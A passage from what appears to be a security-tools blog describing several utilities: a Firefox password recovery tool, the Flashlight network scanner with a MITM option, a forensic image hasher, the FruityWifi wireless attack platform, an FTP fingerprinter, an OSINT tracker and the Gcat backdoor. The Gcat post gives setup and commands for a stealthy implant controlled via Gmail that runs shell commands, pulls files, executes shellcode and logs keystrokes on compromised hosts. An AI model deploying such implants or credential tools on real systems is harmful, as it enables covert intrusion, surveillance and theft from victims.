This greatly helps forensic investigators who can copy the Firefox profile data from the target system to different machine and recover the passwords offline without affecting the target environment.
       <br> 
       <br> 
       <div style="color: green;">
         This mega release supports password recovery from new password file 
        <strong>'logins.json' </strong> starting with Firefox version 32.x.
       </div> 
       <br> 
       <strong>Note:</strong> FirePassword is not hacking or cracking tool as it can only help you to recover your own lost website passwords that are previously stored in Firefox browser. 
       <br> 
       <br> It works on wider range of platforms starting from Windows XP to 
       <strong>Windows 8.</strong>
      </div> 
      <br> 
      <b><span class="Apple-style-span" style="font-size: large;"><a href="https://draft.blogger.com/blogger.g?blogID=8317222231133660547" name="features_firepassword"></a>Features</span></b>
      <br> 
      <ul style="line-height: 150%;"> 
       <li>Instantly decrypt and recover stored encrypted passwords from 'Firefox Sign-on Secret Store' for all versions of Firefox.</li> 
       <li> Recover Passwords from Mozilla based SeaMonkey browser also.</li> 
       <li>Supports recovery of passwords from local system as well as remote system. User can specify Firefox profile location from the remote system to recover the passwords.</li> 
       <li>It can recover passwords from Firefox secret store even when it is protected with<strong> master password</strong>. In such case user have to enter the correct master password to successfully decrypt the sign-on passwords.</li> 
       <li>Automatically discovers Firefox profile location based on installed version of Firefox.</li> 
       <li>On successful recovery operation, username, password along with a corresponding login website is displayed</li> 
       <li>Fully Portable version, can be run from anywhere.</li> 
       <li>Integrated Installer for assisting you in local Installation &amp; Uninstallation.&nbsp;</li> 
      </ul> 
      <div> 
       <span class="Apple-style-span" style="line-height: 24px;"><br></span>
      </div> 
      <div style="text-align: center;"> 
       <span class="Apple-style-span" style="line-height: 24px;"><b><span class="Apple-style-span" style="font-size: x-large;"><a href="http://securityxploded.com/download.php#firepassword" target="_blank">Download&nbsp;FirePassword</a></span></b></span>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="2853746898564537926" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Flashlight - Automated Information Gathering Tool for Penetration Testers  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-2853746898564537926" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://3.bp.blogspot.com/-21JOpLKRrh4/Vm3BnbPl8tI/AAAAAAAAE6I/5fAjKLLQ9CY/s1600/Flashlight.jpeg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="565" src="http://3.bp.blogspot.com/-21JOpLKRrh4/Vm3BnbPl8tI/AAAAAAAAE6I/5fAjKLLQ9CY/s640/Flashlight.jpeg" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        Pentesters spend too much time during information gathering phase. Flashlight (Fener) provides services to scan network/ports and gather information rapidly on target networks. So Flashlight should be the choice to automate discovery step during a penetration test. In this article, usage of Flashligh application will be explained.
      </div> 
      <a name="more"></a>
      <br> 
      <div style="text-align: justify;">
        For more information about using Flashlight, "-h" or "-help" option can be used.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Parameters for the usage of this application can be listed below
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <ul> 
       <li style="text-align: justify;"> -h, --help: It shows the information about using the Flashlight application. </li> 
       <li style="text-align: justify;"> -p &lt;ProjectName&gt; or --project &lt; ProjectName&gt;: It sets project name with the name given. This paramater can be used to save different projects in different workspaces. </li> 
       <li style="text-align: justify;"> -s &lt;ScanType&gt; or –scan_type &lt; ScanType &gt;: It sets the type of scans. There are four types of scans: Active Scan , Passive Scan, Screenshot Scan and Filtering. These types of scans will be examined later in detail. </li> 
       <li style="text-align: justify;"> -d &lt; DestinationNetwork&gt;, --destination &lt; DestinationNetwork &gt;: It sets the network or IP where the scan will be executed against. </li> 
       <li style="text-align: justify;"> -c &lt;FileName&gt;, --config &lt;FileName&gt;: It specifies the configuration file. The scanning is realized according to the information in the configuration file. </li> 
       <li style="text-align: justify;"> -u &lt;NetworkInterface&gt;, --interface &lt; NetworkInterface&gt;: It sets the network interface used during passive scanning. </li> 
       <li style="text-align: justify;"> -f &lt;PcapFile&gt;, --pcap_file &lt; PcapFile &gt;: It sets cap File that will be filtered. </li> 
       <li style="text-align: justify;"> -r &lt;RasterizeFile&gt;, --rasterize &lt; RasterizeFile&gt;: It sets the specific location of Rasterize JavaScript file which will be used for taking screenshots. </li> 
       <li style="text-align: justify;"> -t &lt;ThreadNumber&gt;, --thread &lt;Threadnember&gt;: It sets the number of Threads. This parameter is valid only on screenshot scanning (screen scan) mode. </li> 
       <li style="text-align: justify;"> -o &lt;OutputDiectory&gt;, --output &lt; OutputDiectory &gt;: It sets the directory in which the scan results can be saved. The scan results are saved in 3 sub-directories : For Nmap scanning results, "nmap" subdirectory, for PCAP files "pcap" subdirectory and for screenshots "screen" subdirectories are used. Scan results are saved in directory, shown under the output directories by this parameter. If this option is not set, scan results are saved in the directory that Flashlight applications are running. </li> 
       <li>
        <div style="text-align: justify;">
          -a, --alive: It performs ping scan to
        </div> </li> 
       <li style="text-align: justify;">“-I” parameter is chosen.</li> 
       <li style="text-align: justify;">-l &lt;LogFile&gt;, --log &lt; LogFile &gt;: It specifies the log file to save the scan results. If not set, logs are saved in “flashlight.log” file in working directory.</li> 
       <li style="text-align: justify;">-k &lt;PassiveTimeout&gt;, --passive_timeout &lt;PassiveTimeout&gt;: It specifies the timeout for sniffing in passive mode. Default value is 15 seconds. This parameter is used for passive scan.</li> 
       <li style="text-align: justify;">-m, --mim: It is used to perform MITM attack.</li> 
       <li style="text-align: justify;">-n, --nmap-optimize: It is used to optimize nmap scan.</li> 
       <li style="text-align: justify;">-v, --verbose: It is used to list detailed information.</li> 
       <li style="text-align: justify;">-V, --version: It specifies version of the program.&nbsp;</li> 
       <div style="text-align: justify;">
         &nbsp;discover up IP addresses before the actual vulnerability scan. It is used for active scan.
       </div> 
       <li style="text-align: justify;"> -g &lt;DefaultGateway&gt;, --gateway &lt; DefaultGateway &gt;: It identifies the IP address of the gateway. If not set, interface with “-I” parameter is chosen. </li> 
       <li style="text-align: justify;"> -l &lt;LogFile&gt;, --log &lt; LogFile &gt;: It specifies the log file to save the scan results. If not set, logs are saved in “flashlight.log” file in working directory. </li> 
       <li style="text-align: justify;"> -k &lt;PassiveTimeout&gt;, --passive_timeout &lt;PassiveTimeout&gt;: It specifies the timeout for sniffing in passive mode. Default value is 15 seconds. This parameter is used for passive scan. </li> 
       <li style="text-align: justify;"> -m, --mim: It is used to perform MITM attack. </li> 
       <li style="text-align: justify;"> -n, --nmap-optimize: It is used to optimize nmap scan. </li> 
       <li style="text-align: justify;"> -v, --verbose: It is used to list detailed information. </li> 
       <li style="text-align: justify;"> -V, --version: It specifies version of the program.&nbsp;</li> 
      </ul> 
      <div> 
       <div style="text-align: justify;"> 
        <br>
       </div> 
      </div> 
      <h3> Videos :</h3> 
      <br> 
      <a href="https://www.youtube.com/watch?v=EUMKffaAxzs&amp;list=PL1BVM6VWlmWZOv9Hv8TV2v-kAlUmvA5g7&amp;index=4">https://www.youtube.com/watch?v=EUMKffaAxzs&amp;list=PL1BVM6VWlmWZOv9Hv8TV2v-kAlUmvA5g7&amp;index=4</a> 
      <a href="https://www.youtube.com/watch?v=qCgW-SfYl1c&amp;list=PL1BVM6VWlmWZOv9Hv8TV2v-kAlUmvA5g7&amp;index=5">https://www.youtube.com/watch?v=qCgW-SfYl1c&amp;list=PL1BVM6VWlmWZOv9Hv8TV2v-kAlUmvA5g7&amp;index=5</a> 
      <a href="https://www.youtube.com/watch?v=98Soe01swR8&amp;list=PL1BVM6VWlmWZOv9Hv8TV2v-kAlUmvA5g7&amp;index=6">https://www.youtube.com/watch?v=98Soe01swR8&amp;list=PL1BVM6VWlmWZOv9Hv8TV2v-kAlUmvA5g7&amp;index=6</a> 
      <a href="https://www.youtube.com/watch?v=9wft9zuh1f0&amp;list=PL1BVM6VWlmWZOv9Hv8TV2v-kAlUmvA5g7&amp;index=7">https://www.youtube.com/watch?v=9wft9zuh1f0&amp;list=PL1BVM6VWlmWZOv9Hv8TV2v-kAlUmvA5g7&amp;index=7</a>
      <br> 
      <br> 
      <h3> Installation </h3> 
      <pre><code>apt-get install nmap tshark tcpdump dsniff
</code></pre> In order to install phantomjs easily, you can download and extract it from 
      <a href="https://bitbucket.org/ariya/phantomjs/downloads">https://bitbucket.org/ariya/phantomjs/downloads</a>. 
      <br> Flashlight application can perform 3 basic scan types and 1 analysis type. Each of them are listed below.
      <br> 
      <br> 
      <h2> <a aria-hidden="true" class="anchor" href="https://github.com/galkan/flashlight#-1-passive-scan-" id="user-content--1-passive-scan-"></a></h2> 
      <h2> 1) Passive Scan </h2> In passive scan, no packets are sent into wire. This type of scan is used for listening network and analyzing packets.
      <br> To launch a passive scan by using Flashlight; a project name should be specified like “passive-pro-01”. In the following command, packets that are captured by eth0 are saved into “/root/Desktop/flashlight/output/passive-project-01/pcap" directory, whereas, Pcap files and all logs are saved into "/root/Desktop/log" directory.
      <br> 
      <br> 
      <pre><code>./flashlight.py -s passive -p passive-pro-01 -i eth0 -o /root/Desktop/flashlight_test -l /root/Desktop/log –v
</code></pre> 
      <br> 
      <h2> 2) Active Scan </h2> During an active scan, NMAP scripts are used by reading the configuration file. An example configuration file (flashlight.yaml) is stored in “config” directory under the working directory.
      <br> tcp_ports:
      <br> 
      <pre><code>   - 21, 22, 23, 25, 80, 443, 445, 3128, 8080
</code></pre> udp_ports: 
      <br> 
      <pre><code>   - 53, 161
</code></pre> scripts:
      <br> 
      <pre><code>   - http-enum
</code></pre> 
      <br> According to "flashlight.yaml" configuration file, the scan executes against "21, 22, 23, 25, 80, 443, 445, 3128, 8080" TCP ports, "53, 161" UDP ports, "http-enum" script by using NMAP. 
      <br> 
      <br> 
      <strong>Note:</strong> During active scan “screen_ports” option is useless. This option just works with screen scan.
      <br> “-a” option is useful to discover up hosts by sending ICMP packets. Beside this, incrementing thread number by using “-t” parameter increases scan speed.
      <br> 
      <br> 
      <pre><code>./flashlight.py -p active-project -s active -d 192.168.74.0/24 –t 30 -a -v
</code></pre> 
      <br> By running this command; output files in three different formats (Normal, XML and Grepable) are emitted for four different scan types (Operating system scan, Ping scan, Port scan and Script Scan).
      <br> 
      <br> The example commands that Flashlight Application runs can be given like so:
      <br> 
      <br> 
      <ul> 
       <li>Operating System Scan: /usr/bin/nmap -n -Pn -O -T5 -iL /tmp/"IPListFile" -oA /root/Desktop/flashlight/output/active-project/nmap/OsScan-"Date" </li> 
       <li>Ping Scan: /usr/bin/nmap -n -sn -T5 -iL /tmp/"IPListFile" -oA /root/Desktop/flashlight/output/active-project/nmap/PingScan-"Date" </li> 
       <li>Port Scan: /usr/bin/nmap -n -Pn -T5 --open -iL /tmp/"IPListFile" -sS -p T:21,22,23,25,80,443,445,3128,8080,U:53,161 -sU -oA /root/Desktop/flashlight/output/active-project/nmap/PortScan-"Date" </li> 
       <li>Script Scan: /usr/bin/nmap -n -Pn -T5 -iL /tmp/"IPListFile" -sS -p T:21,22,23,25,80,443,445,3128,8080,U:53,161 -sU --script=default,http-enum -oA /root/Desktop/flashlight/output/active-project/nmap/ScriptScan-"Date"&nbsp;</li> 
      </ul> 
      <br> 
      <h2> &nbsp;3) Screen Scan </h2> Screen Scan is used to get screenshots of web sites/applications by using directives in config file (flashlight.yaml). Directives in this file provide screen scan for four ports ("80, 443, 8080, 8443") screen_ports: - 80, 443, 8080, 8443 Sample screen scan can be performed like this: ``` ./flashlight.py -p project -s screen -d 192.168.74.0/24 -r /usr/local/rasterize.js -t 10 -v ``` 
      <br> 
      <br> 
      <h2> 4) Filtering</h2> Filtering option is used to analyse pcap files. An example for this option is shown below: ``` ./flashlight.py -p filter-project -s filter -f /root/Desktop/flashlight/output/passive-project-02/pcap/20150815072543.pcap -v ``` By running this command some files are created on “filter” sub-folder. This option analyzes PCAP packets according to below properties: 
      <br> 
      <ul> 
       <li>Windows hosts</li> 
       <li>Top 10 DNS requests</li> 
      </ul> 
      <br> ...
      <br> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/galkan/flashlight" target="_blank">Download&nbsp;Flashlight</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="1198748942665972730" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Forpix - Software for detecting affine image files  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-1198748942665972730" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://2.bp.blogspot.com/-a7VpywqCy6U/VSxGgpuTQ6I/AAAAAAAAD3o/l3tNbQn8-NQ/s1600/forpix.gif" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-a7VpywqCy6U/VSxGgpuTQ6I/AAAAAAAAD3o/l3tNbQn8-NQ/s1600/forpix.gif" height="400" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        forpix is a forensic program for identifying similar images that are no longer identical due to image manipulation. Hereinafter I will describe the technical background for the basic understanding of the need for such a program and how it works. 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        From image files or files in general you can create so-called cryptologic hash values, which represent a kind of fingerprint of the file. In practice, these values have the characteristic of being unique. Therefore, if a hash value for a given image is known, the image can be uniquely identified in a large amount of other images by the hash value. The advantage of this fully automated procedure is that the semantic perception of the image content by a human is not required. This methodology is an integral and fundamental component of an effective forensic investigation.
      </div> 
      <a name="more"></a>
      <br> 
      <div style="text-align: justify;">
        Due to the avalanche effect, which is a necessary feature of cryptologic hash functions, a minimum -for a human not to be recognized- change of the image causes a drastic change of the hash value. Although the original image and the manipulated image are almost identical, this will not apply to the hash values any more. Therefore the above mentioned application for identification is ineffective in the case of similar images. 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        A method was applied that resolves the ineffectiveness of cryptologic hash values. It uses the fact that an offender is interested to preserve certain image content. In some degree, this will preserve the contrast as well as the color and frequency distribution. The method provides three algorithms to generate robust hash values of the mentioned image features. In case of a manipulation of the image, the hash values change either not at all or only moderately similar to the degree of manipulation. By comparing the hash values of a known image with those of a large quantity of other images, similar images can now be recognized fully automated. 
      </div> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="http://rojak.de/le/forpix_en.php" target="_blank">Download Forpix</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="2063533470532270591" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> FruityWifi v2.2 - Wireless Network Auditing Tool  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-2063533470532270591" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://3.bp.blogspot.com/-xBOHlgRw7rU/VdyNnBFqyhI/AAAAAAAAEh4/o2JBUDUcw14/s1600/FruityWifi.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-xBOHlgRw7rU/VdyNnBFqyhI/AAAAAAAAEh4/o2JBUDUcw14/s1600/FruityWifi.png"></a>
      </div> 
      <br> 
      <div style="text-align: justify;"> 
       <b>FruityWifi</b> is an open source tool to audit wireless networks. It allows the user to deploy advanced attacks by directly using the web interface or by sending messages to it. 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Initialy the application was created to be used with the Raspberry-Pi, but it can be installed on any Debian based system.
      </div> 
      <a name="more"></a>
      <br> 
      <div style="text-align: justify;">
        FruityWifi v2.0 has many upgrades. A new interface, new modules, Realtek chipsets support, Mobile Broadband (3G/4G) support, a new control panel, and more.
      </div> 
      <br> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://1.bp.blogspot.com/-H-1Mk2gJkfs/VdyN7NrO7eI/AAAAAAAAEiA/4-rj4pPOKlQ/s1600/FruityWifi02.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-H-1Mk2gJkfs/VdyN7NrO7eI/AAAAAAAAEiA/4-rj4pPOKlQ/s1600/FruityWifi02.png"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        A more flexible control panel. Now it is possible to use FruityWifi combining multiple networks and setups: 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        - Ethernet ? Ethernet, 
      </div> 
      <div style="text-align: justify;">
        - Ethernet ? 3G/4G, 
      </div> 
      <div style="text-align: justify;">
        - Ethernet ? Wifi, 
      </div> 
      <div style="text-align: justify;">
        - Wifi ? Wifi, 
      </div> 
      <div style="text-align: justify;">
        - Wifi ? 3G/4G, etc. 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Within the new options on the control panel we can change the AP mode between Hostapd or Airmon-ng allowing to use more chipsets like Realtek. 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        It is possible customize each one of the network interfaces which allows the user to keep the current setup or change it completely.
      </div> 
      <br> 
      <b><span style="font-size: large;">Changelog</span></b>
      <br> 
      <br> 
      <b>v2.2</b>
      <br> 
      <ul> 
       <li>Wireless service has been replaced by AP module</li> 
       <li>Mobile support has been added</li> 
       <li>Bootstrap support has been added</li> 
       <li>Token auth has been added</li> 
       <li>minor fix</li> 
      </ul> 
      <b>v2.1</b>
      <br> 
      <ul> 
       <li>Hostapd Mana support has been added</li> 
       <li>Phishing service has been replaced by phishing module</li> 
       <li>Karma service has been replaced by karma module</li> 
       <li>Sudo has been implemented (replacement for danger)</li> 
       <li>Logs path can be changed</li> 
       <li>Squid dependencies have been removed from FruityWifi installer</li> 
       <li>Phishing dependencies have been removed from FruityWifi installer</li> 
       <li>New AP options available: hostapd, hostapd-mana, hostapd-karma, airmon-ng</li> 
       <li>Domain name can be changed from config panel</li> 
       <li>New install options have been added to install-FruityWifi.sh</li> 
       <li>Install/Remove have been updated</li> 
      </ul> 
      <div> 
       <br>
      </div> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/xtr4nge/FruityWifi" target="_blank">Download&nbsp;FruityWifi</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="1560255809487166229" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> FTPMap - FTP scanner in C  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-1560255809487166229" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://4.bp.blogspot.com/-l4OywVKn_i8/VV-caIOwMwI/AAAAAAAAEFY/2h-pbyVFCTo/s1600/ftpmap.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="382" src="http://4.bp.blogspot.com/-l4OywVKn_i8/VV-caIOwMwI/AAAAAAAAEFY/2h-pbyVFCTo/s640/ftpmap.png" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        Ftpmap scans remote FTP servers to indentify what software and what versions they are running. It uses program-specific fingerprints to discover the name of the software even when banners have been changed or removed, or when some features have been disabled. also FTP-Map can detect Vulnerables by the FTP software/version.
      </div> 
      <a name="more"></a>
      <br> 
      <b><span style="font-size: large;">COMPILATION</span></b>
      <br> 
      <pre><code>./configure
make
make install</code></pre> 
      <br> Using ftpmap is trivial, and the built-in help is self-explanatory :
      <br> 
      <br> 
      <span style="font-size: large;"><b>Examples :</b></span>
      <br> 
      <pre><code>ftpmap -s ftp.c9x.org

ftpmap -P 2121 -s 127.0.0.1

ftpmap -u joe -p joepass -s ftp3.c9x.org</code></pre> 
      <br> 
      <div style="text-align: justify;">
        If a named host has several IP addresses, they are all sequentially scanned. During the scan, ftpmap displays a list of numbers : this is the "fingerprint" of the server.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Another indication that can be displayed if login was successful is the FTP PORT sequence prediction. If the difficulty is too low, it means that anyone can steal your files and change their content, even without knowing your password or sniffing your network.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        There are very few known fingerprints yet, but submissions are welcome.
      </div> 
      <div> 
       <div style="text-align: justify;"> 
        <br>
       </div> 
      </div> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;">Obfuscating FTP servers</span></b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        This software was written as a proof of concept that security through obscurity doesn't work. Many system administrators think that hidding or changing banners and messages in their server software can improve security.&nbsp;
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Don't trust this. Script kiddies are just ignoring banners. If they read that "XYZ FTP software has a vulnerability", they will try the exploit on all FTP servers they will find, whatever software they are running. The same thing goes for free and commercial vulnerability scanners. They are probing exploits to find potential holes, and they just discard banners and messages.&nbsp;
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        On the other hand, removing software name and version is confusing for the system administrator, who has no way to quickly check what's installed on his servers.&nbsp;
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        If you want to sleep quietly, the best thing to do is to keep your systems up to date : subscribe to mailing lists and apply vendor patches.&nbsp;
      </div> 
      <br> 
      <b><span style="font-size: large;">Downloading Ftpmap</span></b>
      <br> 
      <pre><code>git clone git://github.com/Hypsurus/ftpmap </code></pre> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/Hypsurus/ftpmap" target="_blank">Download&nbsp;FTPMap</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="7726318573648986100" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Gcat - A stealthy Backdoor that uses Gmail as a command and control server  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-7726318573648986100" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://3.bp.blogspot.com/-vFWXvSnGYyc/VYGTUUggqQI/AAAAAAAAEO4/oJZK_r9uckg/s1600/gcat.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-vFWXvSnGYyc/VYGTUUggqQI/AAAAAAAAEO4/oJZK_r9uckg/s1600/gcat.jpg"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        A stealthy Python based backdoor that uses Gmail as a command and control server.
       <br> 
       <a name="more"></a>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;">Setup </span></b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        For this to work you need:
      </div> 
      <ul> 
       <li style="text-align: justify;">A Gmail account (<strong>Use a dedicated account! Do not use your personal one!</strong>)</li> 
       <li style="text-align: justify;">Turn on "Allow less secure apps" under the security settings of the account</li> 
      </ul> 
      <div style="text-align: justify;">
        This repo contains two files:
      </div> 
      <ul> 
       <li style="text-align: justify;"><code>gcat.py</code> a script that's used to enumerate and issue commands to available clients</li> 
       <li style="text-align: justify;"><code>implant.py</code> the actual backdoor to deploy</li> 
      </ul> 
      <div style="text-align: justify;">
        In both files, edit the 
       <code>gmail_user</code> and 
       <code>gmail_pwd</code> variables with the username and password of the account you previously setup.
      </div> 
      <div style="text-align: justify;">
        You're probably going to want to compile 
       <code>implant.py</code> into an executable using 
       <a href="https://github.com/pyinstaller/pyinstaller">Pyinstaller</a>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <span style="font-size: large;"><b>Usage</b></span>
      </div> 
      <pre><code>Gcat

optional arguments:
  -h, --help            show this help message and exit
  -v, --version         show program's version number and exit
  -id ID                Client to target
  -jobid JOBID          Job id to retrieve

  -list                 List available clients
  -info                 Retrieve info on specified client

Commands:
  Commands to execute on an implant

  -cmd CMD              Execute a system command
  -download PATH        Download a file from a clients system
  -exec-shellcode FILE  Execute supplied shellcode on a client
  -screenshot           Take a screenshot
  -lock-screen          Lock the clients screen
  -force-checkin        Force a check in
  -start-keylogger      Start keylogger
  -stop-keylogger       Stop keylogger
</code></pre> 
      <ul> 
       <li>Once you've deployed the backdoor on a couple of systems, you can check available clients using the list command:</li> 
      </ul> 
      <pre><code>#~ python gcat.py -list
f964f907-dfcb-52ec-a993-543f6efc9e13 Windows-8-6.2.9200-x86
90b2cd83-cb36-52de-84ee-99db6ff41a11 Windows-XP-5.1.2600-SP3-x86
</code></pre> The output is a UUID string that uniquely identifies the system and the OS the implant is running on
      <br> 
      <ul> 
       <li>Let's issue a command to an implant:</li> 
      </ul> 
      <pre><code>#~ python gcat.py -id 90b2cd83-cb36-52de-84ee-99db6ff41a11 -cmd 'ipconfig /all'
[*] Command sent successfully with jobid: SH3C4gv
</code></pre> Here we are telling 
      <code>90b2cd83-cb36-52de-84ee-99db6ff41a11</code> to execute 
      <code>ipconfig /all</code>, the script then outputs the 
      <code>jobid</code> that we can use to retrieve the output of that command
      <br> 
      <ul> 
       <li>Lets get the results!</li> 
      </ul> 
      <pre><code>#~ python gcat.py -id 90b2cd83-cb36-52de-84ee-99db6ff41a11 -jobid SH3C4gv     
DATE: 'Tue, 09 Jun 2015 06:51:44 -0700 (PDT)'
JOBID: SH3C4gv
FG WINDOW: 'Command Prompt - C:\Python27\python.exe implant.py'
CMD: 'ipconfig /all'


Windows IP Configuration

        Host Name . . . . . . . . . . . . : unknown-2d44b52
        Primary Dns Suffix  . . . . . . . : 
        Node Type . . . . . . . . . . . . : Unknown
        IP Routing Enabled. . . . . . . . : No
        WINS Proxy Enabled. . . . . . . . : No

-- SNIP --
</code></pre> 
      <ul> 
       <li>That's the gist of it! But you can do much more as you can see from the usage of the script! ;)</li> 
      </ul> 
      <div> 
       <br>
      </div> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/byt3bl33d3r/gcat" target="_blank">Download Gcat</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="7432494059887625534" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Geotweet - Social engineering tool for human hacking  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-7432494059887625534" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://2.bp.blogspot.com/-FsnbaxGgwvg/VdpD16fBJFI/AAAAAAAAEgQ/qqMUL-VqSr8/s1600/Geotweet.jpeg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="426" src="http://2.bp.blogspot.com/-FsnbaxGgwvg/VdpD16fBJFI/AAAAAAAAEgQ/qqMUL-VqSr8/s640/Geotweet.jpeg" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        Another way to use Twitter and instagram. Geotweet is an osint application that allows you to track tweets and instagram and trace geographical locations and then export to google maps. Allows you to search on tags, world zones and user (info and timeline).
      </div> 
      <a name="more"></a>
      <br> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;">Requirements</span></b>
      </div> 
      <ul> 
       <li style="text-align: justify;">Python 2.7</li> 
       <li style="text-align: justify;">PyQt4, tweepy, geopy, ca_certs_locater, python-instagram</li> 
       <li style="text-align: justify;">Works on Linux, Windows, Mac OSX, BSD</li> 
      </ul> 
      <br> 
      <b><span style="font-size: large;">Installation </span></b>
      <br> 
      <pre><code>git clone https://github.com/Pinperepette/Geotweet_GUI.git
cd Geotweet_GUI
chmode +x Geotweet.py
sudo apt-get install python-pip
sudo pip install tweepy
sudo pip install geopy
sudo pip install ca_certs_locater
sudo pip install python-instagram
python ./Geotweet.py</code></pre> 
      <br> 
      <br> 
      <b><span style="font-size: large;">Video </span></b>
      <br> 
      <div style="text-align: center;"> 
       <iframe allowfullscreen frameborder="0" height="360" src="https://www.youtube.com/embed/QCeqy5B-1bo" width="640"></iframe>
      </div> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/Pinperepette/Geotweet_GUI" target="_blank">Download Geotweet</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="6232166783114692085" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> GetHead - HTTP Header Analysis Vulnerability Tool  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-6232166783114692085" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://4.bp.blogspot.com/-p0E8i2hdaoQ/VkvlX1ME4jI/AAAAAAAAEzc/QKQYJeCdyN4/s1600/gethead.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="438" src="http://4.bp.blogspot.com/-p0E8i2hdaoQ/VkvlX1ME4jI/AAAAAAAAEzc/QKQYJeCdyN4/s640/gethead.png" width="640"></a>
      </div> 
